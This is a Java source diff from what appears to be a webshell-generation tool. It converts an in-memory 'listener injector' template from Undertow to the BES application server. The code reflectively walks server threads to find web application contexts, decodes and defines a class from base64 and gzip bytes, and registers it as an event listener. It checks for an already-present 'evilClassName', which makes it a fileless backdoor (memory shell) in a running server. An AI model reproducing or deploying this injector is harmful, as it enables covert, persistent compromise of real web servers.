@@ -1,18 +1,17 @@
 package jmg.core.template;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
 import java.util.zip.GZIPInputStream;
 
 
-public class UndertowListenerInjectorTpl {
-
+public class BESListenerInjectorTpl {
 
     public String getClassName() {
         return "";
@@ -23,10 +22,10 @@ public class UndertowListenerInjectorTpl {
     }
 
     static {
-        new UndertowListenerInjectorTpl();
+        new BESListenerInjectorTpl();
     }
 
-    public UndertowListenerInjectorTpl() {
+    public BESListenerInjectorTpl() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
@@ -40,25 +39,46 @@ public class UndertowListenerInjectorTpl {
     }
 
     public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
-        List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
-        for (int i = 0; i < threads.length; i++) {
-            try {
-                Object requestContext = invokeMethod(threads[i].getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
-                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
-                if (servletContext != null) contexts.add(servletContext);
-            } catch (Exception ignored) {
+        List<Object> contexts = new ArrayList();
+        Thread[] threads = getThreads();
+        try {
+            for (Thread thread : threads) {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
+                    for (Object key : childrenMap.keySet()) {
+                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
+                        for (Object key1 : children.keySet()) {
+                            Object context = children.get(key1);
+                            if (context != null) contexts.add(context);
+                        }
+                    }
+                }
             }
+        } catch (Exception ignored) {
         }
         return contexts;
+    }
+
+    public Thread[] getThreads() {
+        Thread[] var0 = null;
+
+        try {
+            var0 = (Thread[]) (invokeMethod(Thread.class, "getThreads"));
+        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException var3) {
+            ThreadGroup var2 = Thread.currentThread().getThreadGroup();
+            var0 = new Thread[var2.activeCount()];
+            var2.enumerate(var0);
+        }
+
+        return var0;
     }
 
     private ClassLoader getWebAppClassLoader(Object context) throws Exception {
         try {
             return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
         } catch (Exception e) {
-            Object deploymentInfo = getFV(context, "deploymentInfo");
-            return ((ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null));
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
         }
     }
 
@@ -74,41 +94,39 @@ public class UndertowListenerInjectorTpl {
                 defineClass.setAccessible(true);
                 Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                 listener = clazz.newInstance();
-            } catch (Throwable tt) {
+            } catch (Exception ignored) {
             }
+
         }
         return listener;
     }
 
-    // 添加有效 io.undertow.servlet.core.ApplicationListeners.addListener
-    // 添加无效 io.undertow.servlet.api.DeploymentInfo.addListener
-    public void addListener(Object context, Object listener) {
+    public void addListener(Object context, Object listener) throws Exception {
+        if (isInjected(context, listener.getClass().getName())) {
+            return;
+        }
         try {
-            if (isInjected(context, listener.getClass().getName())) {
-                return;
-            }
-            Class listenerInfoClass = Class.forName("io.undertow.servlet.api.ListenerInfo");
-            Object listenerInfo = listenerInfoClass.getConstructor(Class.class).newInstance(listener.getClass());
-            Object deploymentImpl = getFV(context, "deployment");
-            Object applicationListeners = getFV(deploymentImpl, "applicationListeners");
-            Class managedListenerClass = Class.forName("io.undertow.servlet.core.ManagedListener");
-            Object managedListener = managedListenerClass.getConstructor(listenerInfoClass, boolean.class).newInstance(listenerInfo, true);
-            invokeMethod(applicationListeners, "addListener", new Class[]{managedListenerClass}, new Object[]{managedListener});
-        } catch (Throwable e) {
+            invokeMethod(context, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{listener});
+        } catch (Exception e) {
+            Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners", new Class[0], new Object[0]);
+            List listeners = Arrays.asList(objects);
+            ArrayList arrayList = new ArrayList(listeners);
+            arrayList.add(listener);
+            invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{(Object) arrayList.toArray()});
         }
     }
 
     public boolean isInjected(Object context, String evilClassName) throws Exception {
-        List allListeners = (List) getFV(getFV(getFV(context, "deployment"), "applicationListeners"), "allListeners");
-        for (int i = 0; i < allListeners.size(); i++) {
-            Class listener = (Class) getFV(getFV(allListeners.get(i), "listenerInfo"), "listenerClass");
-            if (listener.getName().contains(evilClassName)) {
+        Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners", new Class[0], new Object[0]);
+        List listeners = Arrays.asList(objects);
+        ArrayList arrayList = new ArrayList(listeners);
+        for (int i = 0; i < arrayList.size(); i++) {
+            if (arrayList.get(i).getClass().getName().contains(evilClassName)) {
                 return true;
             }
         }
         return false;
     }
-
 
     static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
         Class<?> decoderClass;
@@ -134,10 +152,6 @@ public class UndertowListenerInjectorTpl {
         return out.toByteArray();
     }
 
-    synchronized void setFV(Object var0, String var1, Object val) throws Exception {
-        getF(var0, var1).set(var0, val);
-    }
-
     static Object getFV(Object obj, String fieldName) throws Exception {
         Field field = getF(obj, fieldName);
         field.setAccessible(true);
@@ -157,7 +171,6 @@ public class UndertowListenerInjectorTpl {
         }
         throw new NoSuchFieldException(fieldName);
     }
-
 
     static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
         return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
